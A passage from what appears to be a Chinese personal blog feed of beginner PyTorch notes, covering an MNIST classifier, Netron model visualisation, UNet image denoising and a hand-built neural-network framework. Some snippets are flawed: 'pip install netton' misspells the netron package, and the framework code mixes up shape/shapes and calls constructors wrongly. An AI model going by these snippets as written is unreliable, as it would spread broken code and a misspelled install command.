class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(NeuralNetwork, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.flatten = torch.nn.Flatten()</span><br><span class="line">        <span class="variable language_">self</span>.linear_relu_stack = torch.nn.Sequential(</span><br><span class="line">            torch.nn.Linear(<span class="number">28</span> * <span class="number">28</span>, <span class="number">312</span>),</span><br><span class="line">            torch.nn.ReLU(),</span><br><span class="line">            torch.nn.Linear(<span class="number">312</span>, <span class="number">256</span>),</span><br><span class="line">            torch.nn.ReLU(),</span><br><span class="line">            torch.nn.Linear(<span class="number">256</span>, <span class="number">10</span>),</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, <span class="built_in">input</span></span>):</span><br><span class="line">        x = <span class="variable language_">self</span>.flatten(<span class="built_in">input</span>)</span><br><span class="line">        logits = <span class="variable language_">self</span>.linear_relu_stack(x)</span><br><span class="line">        <span class="keyword">return</span> logits</span><br><span class="line"></span><br><span class="line">model = NeuralNetwork()</span><br><span class="line">model = model.to(device) <span class="comment">#将计算模型传入GPU硬件等待计算</span></span><br><span class="line"><span class="comment"># model = torch.compile(model) #加速计算速度</span></span><br><span class="line">loss_fu = torch.nn.CrossEntropyLoss()</span><br><span class="line">optimizer = torch.optim.Adam(model.parameters(), lr = <span class="number">2e-5</span>) <span class="comment">#设定优化器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 载入数据</span></span><br><span class="line">x_train = np.load(<span class="string">&quot;../MNIST/mnist/mnist/x_train.npy&quot;</span>)</span><br><span class="line">y_train_label = np.load(<span class="string">&quot;../MNIST/mnist/mnist/y_train_label.npy&quot;</span>)</span><br><span class="line">train_num = <span class="built_in">len</span>(x_train)//batch_size</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始计算</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    train_loss = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(train_num):</span><br><span class="line">        start = i * batch_size</span><br><span class="line">        end = (i + <span class="number">1</span>) * batch_size</span><br><span class="line">        train_batch = torch.tensor(x_train[start:end]).to(device)</span><br><span class="line">        label_batch = torch.tensor(y_train_label[start:end]).to(device)</span><br><span class="line"></span><br><span class="line">        pred = model(train_batch)</span><br><span class="line">        loss = loss_fu(pred, label_batch)</span><br><span class="line"></span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line"></span><br><span class="line">        train_loss += loss.item()</span><br><span class="line"></span><br><span class="line">    train_loss /= train_num</span><br><span class="line">    accuracy = (pred.argmax(<span class="number">1</span>) == label_batch).<span class="built_in">type</span>(torch.float32).<span class="built_in">sum</span>().item() / batch_size</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;train_loss: &quot;</span>, <span class="built_in">round</span>(train_loss, <span class="number">2</span>), <span class="string">&quot; accuracy: &quot;</span>, <span class="built_in">round</span>(accuracy, <span class="number">2</span>))</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241113172701831.png"
                      alt="image-20241113172701831"
                ><figcaption>image-20241113172701831</figcaption></figure></p>
<p>随着循环的增加，模型训练的损失值在不断降低，精度在不断提高。</p>
<h2 id="利用Netron实现模型可视化"><a href="#利用Netron实现模型可视化" class="headerlink" title="利用Netron实现模型可视化"></a>利用Netron实现模型可视化</h2><p><code>Netron</code>是一个开源的深度学习和机器学习模型可视化工具，能够以图形化的方式展示各种深度神经网络、机器学习模型及其结构。</p>
<p>安装可以通过<code>Github</code>下载：<a class="link"   href="https://github.com/lutzroeder/netron?tab=readme-ov-file#install" >GitHub - lutzroeder&#x2F;netron: Visualizer for neural network, deep learning and machine learning models<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>也可以使用网页版：<a class="link"   href="https://netron.app/" >Netron<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>pip导入<code>netron</code>库；</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">pip install netton</span><br><span class="line">pip install onnx</span><br></pre></td></tr></table></figure></div>

<p>我个人使用网页版，首先要将模型保存为<code>.pth</code>文件，然后通过网页版进行打开；</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NeuralNetwork</span>(torch.nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(NeuralNetwork, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.flatten = torch.nn.Flatten()</span><br><span class="line">        <span class="variable language_">self</span>.linear_relu_stack = torch.nn.Sequential(</span><br><span class="line">            torch.nn.Linear(<span class="number">28</span> * <span class="number">28</span>, <span class="number">312</span>),</span><br><span class="line">            torch.nn.ReLU(),</span><br><span class="line">            torch.nn.Linear(<span class="number">312</span>, <span class="number">256</span>),</span><br><span class="line">            torch.nn.ReLU(),</span><br><span class="line">            torch.nn.Linear(<span class="number">256</span>, <span class="number">10</span>),</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, <span class="built_in">input</span></span>):</span><br><span class="line">        x = <span class="variable language_">self</span>.flatten(<span class="built_in">input</span>)</span><br><span class="line">        logits = <span class="variable language_">self</span>.linear_relu_stack(x)</span><br><span class="line">        <span class="keyword">return</span> logits</span><br><span class="line"></span><br><span class="line">model = NeuralNetwork()</span><br><span class="line">torch.save(model, <span class="string">&#x27;./model.pth&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241113175105800.png"
                      alt="image-20241113175105800"
                ><figcaption>image-20241113175105800</figcaption></figure></p>
]]></content>
      <categories>
        <category>大模型开发</category>
        <category>PyTorch</category>
        <category>ChatGLM</category>
      </categories>
      <tags>
        <tag>大模型开发</tag>
        <tag>PyTorch</tag>
        <tag>ChatGLM</tag>
      </tags>
  </entry>
  <entry>
    <title>深度学习模型实战之图像降噪</title>
    <url>/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E5%AE%9E%E6%88%98%E4%B9%8B%E5%9B%BE%E5%83%8F%E9%99%8D%E5%99%AA.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在读从零开始的大模型开发，本文以记录第二章的PyTorch2.0的环境搭建以及第一个深度学习模型实战之图像降噪。</p>
<h1 id="环境搭建之安装PyTorch-2-0"><a href="#环境搭建之安装PyTorch-2-0" class="headerlink" title="环境搭建之安装PyTorch 2.0"></a>环境搭建之安装PyTorch 2.0</h1><p>安装<code>anaconda</code>：<a class="link"   href="https://www.anaconda.com/" >Anaconda | The Operating System for AI<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>安装<code>PyTorch</code>：<a class="link"   href="https://pytorch.org/" >PyTorch<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">pip3 install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118</span><br></pre></td></tr></table></figure></div>

<h1 id="图像降噪实战"><a href="#图像降噪实战" class="headerlink" title="图像降噪实战"></a>图像降噪实战</h1><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step.1"></a>Step.1</h2><p>首先是准备<code>MNIST</code>数据集，即深度学习编程中的<code>Hello world</code>。</p>
<p>该数据集包括：</p>
<ul>
<li>训练数据集</li>
<li>训练数据集标签</li>
<li>测试数据集</li>
<li>测试数据集标签</li>
</ul>
<p><code>MNIST</code>数据集一共有七万张图片，其中六万张是训练集，一万张是测试集。每一张是784（28 x 28）字节的0~9的数字，黑底白字。</p>
<p>在网上以及文章中找到的<code>MNIST</code>训练集内部文件结构：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TRAINING SET LABEL FILE (train-labels-idx1-ubyte):</span><br><span class="line"> </span><br><span class="line">[offset] [type]          [value]          [description] </span><br><span class="line">0000     32 bit integer  0x00000801(2049) magic number (MSB first) </span><br><span class="line">0004     32 bit integer  60000            number of items </span><br><span class="line">0008     unsigned byte   ??               label </span><br><span class="line">0009     unsigned byte   ??               label </span><br><span class="line">........ </span><br><span class="line">xxxx     unsigned byte   ??               label</span><br><span class="line">The labels values are 0 to 9.</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241110225832773.png"
                      alt="image-20241110225832773"
                ><figcaption>image-20241110225832773</figcaption></figure></p>
<p>可以看到里面有6万个标签，每个标签的值为一个0~9的数字。</p>
<p>首先该数据集是二进制文件，所以是以<code>rb</code>的方式读取，而且真正的数据在<code>value</code>的这项里。在读取数据时，首先要读取4个32位int，分别是<code>magic number</code>、<code>number of image</code>、<code>number of rows</code>、<code>number of columns</code>。</p>
<p>对于数据集的获取网上也有很多代码，本文是以书籍作为导向进行学习，用的是书籍作者给的代码，在这里就不多赘述了；</p>
<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step.2"></a>Step.2</h2><p>对于PyTorch的深度学习的项目，模型的设计是一个非常重要的内容。</p>
<p>模型用于决定在深度学习项目中采用哪种方式完成目标的主体设计，在该项目中，我们的目的就是输入一幅图像，然后对其进行去噪。</p>
<p>在文章中，对于模型的选择思路为“图像输出大小就应该是输入的大小”，选择了<code>Unet</code>（一种卷积神经网络）作为设计的主要模型。</p>
<p>而笔者现在几乎属于是零知识储备的学习，所以<code>Unet</code>的代码实现以及结构在本文章中不会进行详细说明，下一篇文章将会深入学习该模型：</p>
<p>占位：Unet模型详细学习</p>
<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step.3"></a>Step.3</h2><p>要完成一个深度学习项目，除了深度学习模型，还需要一个内容就是设定模型的损失函数与优化函数。</p>
<p>对于损失函数的选择，选用了<code>MSELoss</code>作为损失函数，即均方损失函数。</p>
<p><code>MSELoss</code>的作用是计算预测值和真实值之间的欧式距离，预测值和真实值越接近，两者的均方差就越小。代码为：</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">loss = torch.nn.MSELoss(reduction=<span class="string">&quot;sum&quot;</span>)(pred, y_batch)</span><br></pre></td></tr></table></figure></div>

<p>优化函数的设定选用了<code>Adam</code>优化器，代码为：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">optimizer = torch.optim.Adam(model.parameters(), lr=<span class="number">2e-5</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step.4"></a>Step.4</h2><p>接下来就是使用<code>PyTorch</code>训练出一个可以实现去噪性能的深度学习整理模型，代码如下：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.environ[<span class="string">&#x27;CUDA_VISIBLE_DEVICES&#x27;</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> unet</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">batch_size = <span class="number">320</span> <span class="comment">#设定每次训练的批次数</span></span><br><span class="line">epochs = <span class="number">1024</span> <span class="comment">#训练次数</span></span><br><span class="line"></span><br><span class="line">device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">model = unet.Unet() <span class="comment">#导入Unet模型</span></span><br><span class="line">model = model.to(device) <span class="comment">#将计算模型传入GPU硬件等待计算</span></span><br><span class="line">optimizer = torch.optim.Adam(model.parameters(), lr=<span class="number">2e-5</span>) <span class="comment">#设定优化函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#载入数据</span></span><br><span class="line">x_train = np.load(<span class="string">&quot;./MNIST/mnist/mnist/x_train.npy&quot;</span>)</span><br><span class="line">y_train_label = np.load(<span class="string">&quot;./MNIST/mnist/mnist/y_train_label.npy&quot;</span>)</span><br><span class="line"></span><br><span class="line">x_train_batch = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y_train_label)):</span><br><span class="line">    <span class="keyword">if</span> y_train_label[i] &lt;= <span class="number">10</span>:</span><br><span class="line">        x_train_batch.append(x_train[i])</span><br><span class="line"></span><br><span class="line">x_train = np.reshape(x_train_batch, [-<span class="number">1</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>]) <span class="comment">#修正数据输入维度：([30596, 28, 28)]</span></span><br><span class="line">x_train /= <span class="number">512</span></span><br><span class="line">train_length = <span class="built_in">len</span>(x_train) * <span class="number">20</span> <span class="comment">#增加数据的单词循环次数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    train_num = train_length//batch_size <span class="comment">#计算有多少批次数</span></span><br><span class="line"></span><br><span class="line">    train_loss = <span class="number">0</span> <span class="comment">#损失函数的统计</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(train_num)): <span class="comment">#开始训环训练</span></span><br><span class="line">        x_imgs_batch = []</span><br><span class="line">        x_step_batch = []</span><br><span class="line">        y_batch = []</span><br><span class="line">        <span class="comment">#对每个批次内的数据进行处理</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(batch_size):</span><br><span class="line">            img = x_train[np.random.randint(x_train.shape[<span class="number">0</span>])] <span class="comment">#提取单个图片内容</span></span><br><span class="line">            x = img</span><br><span class="line">            y = img</span><br><span class="line"></span><br><span class="line">            x_imgs_batch.append(x)</span><br><span class="line">            y_batch.append(y)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#将批次数据转化为PyTorch对应的tensor格式并将其传入GPU中</span></span><br><span class="line">        x_imgs_batch = torch.tensor(x_imgs_batch).<span class="built_in">float</span>().to(device)</span><br><span class="line">        y_batch = torch.tensor(y_batch).<span class="built_in">float</span>().to(device)</span><br><span class="line"></span><br><span class="line">        pred = model(x_imgs_batch) <span class="comment">#对模型进行正向计算</span></span><br><span class="line">        loss = torch.nn.MSELoss(reduction=<span class="string">&#x27;sum&#x27;</span>)(pred, y_batch) * <span class="number">100</span> <span class="comment">#使用MESLoss损失函数进行计算</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#固定格式，一般这样使用</span></span><br><span class="line">        optimizer.zero_grad() <span class="comment">#对结果进行优化计算</span></span><br><span class="line">        loss.backward() <span class="comment">#损失值的反向传播</span></span><br><span class="line">        optimizer.step() <span class="comment"># 对参数进行更新</span></span><br><span class="line"></span><br><span class="line">        train_loss += loss.item() <span class="comment">#记录每个批次的损失值</span></span><br><span class="line">    <span class="comment">#计算并打印损失值</span></span><br><span class="line">    train_loss /= train_num</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Train_loss: &quot;</span>, train_loss)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#对数据进行打印</span></span><br><span class="line">    image = x_train[np.random.randint(x_train.shape[<span class="number">0</span>])] <span class="comment">#随机挑选一条数据进行计算</span></span><br><span class="line">    image = np.reshape(image, [<span class="number">1</span>, <span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>]) <span class="comment">#修正数据维度</span></span><br><span class="line"></span><br><span class="line">    image = torch.tensor(image).<span class="built_in">float</span>().to(device) <span class="comment">#挑选的数据传入硬件中等待计算</span></span><br><span class="line">    image = model(image) <span class="comment">#使用模型对数据进行计算</span></span><br><span class="line"></span><br><span class="line">    image = torch.reshape(image, shape=[<span class="number">28</span>, <span class="number">28</span>]) <span class="comment">#修正模型输出结果</span></span><br><span class="line">    image = image.detach().cpu().numpy() <span class="comment">#将计算结果导入CPU中进行后续计算或展示</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#展示或计算数据结果</span></span><br><span class="line">    plt.imshow(image)</span><br><span class="line">    plt.savefig(<span class="string">f&quot;./img/img_<span class="subst">&#123;epoch&#125;</span>.png&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241111162051375.png"
                      alt="image-20241111162051375"
                ><figcaption>image-20241111162051375</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241111162101049.png"
                      alt="image-20241111162101049"
                ><figcaption>image-20241111162101049</figcaption></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在本文章中主要是对于基于<code>PyTorch</code>的深度学习做一个初步的了解，并通过第一个深度学习的项目——图像降噪来进行一个神经网络、深度学习等代码的学习</p>
]]></content>
      <categories>
        <category>大模型开发</category>
        <category>PyTorch</category>
        <category>ChatGLM</category>
      </categories>
      <tags>
        <tag>大模型开发</tag>
        <tag>PyTorch</tag>
        <tag>ChatGLM</tag>
      </tags>
  </entry>
  <entry>
    <title>针对于自定义神经网络框架的基本设计</title>
    <url>/posts/%E9%92%88%E5%AF%B9%E4%BA%8E%E8%87%AA%E5%AE%9A%E4%B9%89%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AE%BE%E8%AE%A1.html</url>
    <content><![CDATA[<p>针对于设计自定义神经网络框架，最基本的过程包括两个阶段，就是训练和预测，做了个思维导图就是这样的：</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241114100759196.png"
                      alt="image-20241114100759196"
                ><figcaption>image-20241114100759196</figcaption></figure></p>
<h1 id="神经网络框架的抽象实现"><a href="#神经网络框架的抽象实现" class="headerlink" title="神经网络框架的抽象实现"></a>神经网络框架的抽象实现</h1><p>神经网络的预测就是训练过程的一部分，所以，我们可以对神经网络中的基本组件进行抽象；包括四部分，分别为数据输入，计算层，损失计算和优化器：</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20241114101013143.png"
                      alt="image-20241114101013143"
                ><figcaption>image-20241114101013143</figcaption></figure></p>
<p>作用分别为：</p>
<ul>
<li>**输入数据：**这个是神经网络中数据输入的基本内容，一般称其为<code>tensor</code>；</li>
<li>**计算层：**负责接收上一层的输入，进行该层的运算，并将结果输出给下一层，由于<code>tensor</code>的流动有前向和反向两个方向，因此对于每种类型的网络层，我们都需要同时实现<code>forward</code>和<code>backward</code>两种运算；</li>
<li>**激活层：**通常与计算层结合在一起对每个计算层进行非线性分割；</li>
<li>**损失计算：**在给定模型预测值与真实值之后，使用该组件计算损失之以及关于最后一层的梯度；</li>
<li><strong>优化器</strong>：负责使用梯度更新模型的参数。</li>
</ul>
<h1 id="自定义神经网络框架的具体实现"><a href="#自定义神经网络框架的具体实现" class="headerlink" title="自定义神经网络框架的具体实现"></a>自定义神经网络框架的具体实现</h1><h2 id="tensor数据包装"><a href="#tensor数据包装" class="headerlink" title="tensor数据包装"></a>tensor数据包装</h2><p>张量是神经网络的基本数据单位；</p>
<p>可以直接生成</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">tensor = np.random.random(size = (<span class="number">10</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>))</span><br></pre></td></tr></table></figure></div>

<h2 id="layer计算层的基类与实现"><a href="#layer计算层的基类与实现" class="headerlink" title="layer计算层的基类与实现"></a>layer计算层的基类与实现</h2><p>计算层是对输入的数据进行计算，在这一层中输入数据的前向计算在<code>forward</code>过程中完成；而对于计算层来说，除了<code>forward</code>外，还需要实现一个<code>backward</code>的过程；</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;Base class for Layer&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Layer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.params = &#123;p: <span class="literal">None</span> <span class="keyword">for</span> p <span class="keyword">in</span> <span class="variable language_">self</span>.param_names&#125;  <span class="comment"># 存储可训练参数（权重、偏置等）</span></span><br><span class="line">        <span class="variable language_">self</span>.nt_params = &#123;p: <span class="literal">None</span> <span class="keyword">for</span> p <span class="keyword">in</span> <span class="variable language_">self</span>.nt_param_names&#125; <span class="comment"># 存储不可训练参数（均值、方差等）</span></span><br><span class="line">        <span class="variable language_">self</span>.initializers = &#123;&#125; <span class="comment"># 存储每个参数的初始化方法</span></span><br><span class="line">        <span class="variable language_">self</span>.grads = &#123;&#125; <span class="comment"># 存储每个可训练参数的梯度</span></span><br><span class="line">        <span class="variable language_">self</span>.shapes = &#123;&#125; <span class="comment"># 存储每个参数的形状信息（例如权重矩阵的维度）</span></span><br><span class="line">        <span class="variable language_">self</span>._is_training = <span class="literal">True</span> <span class="comment"># 当前网络是否处于训练模式</span></span><br><span class="line">        <span class="variable language_">self</span>._is_init = <span class="literal">False</span> <span class="comment"># 表示是否已经初始化</span></span><br><span class="line">        <span class="variable language_">self</span>.ctx = &#123;&#125; <span class="comment"># 存储每层计算时的上下文信息，包括一些临时变量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        shape = <span class="literal">None</span> <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.shapes <span class="keyword">else</span> <span class="variable language_">self</span>.shapes</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;layer: <span class="subst">&#123;self.name&#125;</span>\tshape: <span class="subst">&#123;shape&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, inputs</span>):</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backward</span>(<span class="params">self, grad</span>):</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_init</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._is_init</span><br><span class="line"></span><br><span class="line"><span class="meta">    @is_init.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_init</span>(<span class="params">self, is_init</span>):</span><br><span class="line">        <span class="variable language_">self</span>._is_init = is_init</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> <span class="variable language_">self</span>.param_names:</span><br><span class="line">            <span class="variable language_">self</span>.shapes[name] = <span class="variable language_">self</span>.params[name].shape</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_training</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._is_training</span><br><span class="line"></span><br><span class="line"><span class="meta">    @is_training.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_training</span>(<span class="params">self, is_train</span>):</span><br><span class="line">        <span class="variable language_">self</span>._is_training = is_train</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.__class__.__name__</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">param_names</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> ()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">nt_param_names</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> ()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_init_params</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> <span class="variable language_">self</span>.param_names:</span><br><span class="line">            <span class="variable language_">self</span>.params[name] = <span class="variable language_">self</span>.initializers[name](<span class="variable language_">self</span>.shapes[name])</span><br><span class="line">        <span class="variable language_">self</span>.is_init = <span class="literal">True</span></span><br></pre></td></tr></table></figure></div>

<h2 id="计算层——全连接层"><a href="#计算层——全连接层" class="headerlink" title="计算层——全连接层"></a>计算层——全连接层</h2><p>全连接层在整个卷积神经网络中起到分类器的作用；</p>
<p>在全连接层的计算过程中，<code>forward</code>接受上层</p>
<p>的输入<code>inputs</code>实现<code>wx + b</code>的计算；<code>backward</code>正好相反，接受来自反向的梯度：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from initializer import XavierUniform</span><br><span class="line">from initializer import Zeros</span><br><span class="line"></span><br><span class="line">class Dense(Layer):</span><br><span class="line">    def __init__(self,</span><br><span class="line">                 num_out,</span><br><span class="line">                 w_init = XavierUniform(),</span><br><span class="line">                 b_init = Zeros()):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.initializers = &#123;&quot;w&quot;: w_init, &quot;b&quot;: b_init&#125;</span><br><span class="line">        self.shape = &#123;&quot;w&quot;: [None, num_out], &quot;b&quot;: [None, num_out]&#125;</span><br><span class="line"></span><br><span class="line">    def forward(self, inputs):</span><br><span class="line">        if not self.is_init:</span><br><span class="line">            self.shapes[&quot;w&quot;][0] = inputs.shape[1]</span><br><span class="line">            self._init_params()</span><br><span class="line">        self.ctx = &#123;&quot;X&quot;: inputs&#125;</span><br><span class="line">        return inputs @ self.params[&quot;w&quot;] + self.params[&quot;b&quot;]</span><br><span class="line"></span><br><span class="line">    def backward(self, grad):</span><br><span class="line">        self.grads[&quot;w&quot;] = self.ctx[&quot;X&quot;].T @ grad</span><br><span class="line">        self.grads[&quot;b&quot;] = np.sum(grad, axis=0)</span><br><span class="line">        return grad @ self.params[&quot;w&quot;].T</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def param_names(self):</span><br><span class="line">        return &quot;w&quot;, &quot;b&quot;</span><br></pre></td></tr></table></figure></div>

<h2 id="激活层的基类与实现"><a href="#激活层的基类与实现" class="headerlink" title="激活层的基类与实现"></a>激活层的基类与实现</h2><p>激活函数可以看作是一个网络层，通过继承<code>Layer</code>基类实现激活函数类，这里使用了<code>ReLU</code>激活函数；</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Activation</span>(<span class="title class_ inherited__">Layer</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(name)</span><br><span class="line">        <span class="variable language_">self</span>.inputs = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, inputs</span>):</span><br><span class="line">        <span class="variable language_">self</span>.inputs = inputs</span><br><span class="line">        <span class="keyword">return</span>  <span class="variable language_">self</span>.forward_func(inputs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backward</span>(<span class="params">self, grad</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.backward_func(<span class="variable language_">self</span>.inputs) * grad</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward_func</span>(<span class="params">self, inputs</span>):</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backward_func</span>(<span class="params">self, inputs</span>):</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Relu</span>(<span class="title class_ inherited__">Layer</span>):</span><br><span class="line">    <span class="keyword">def</span> 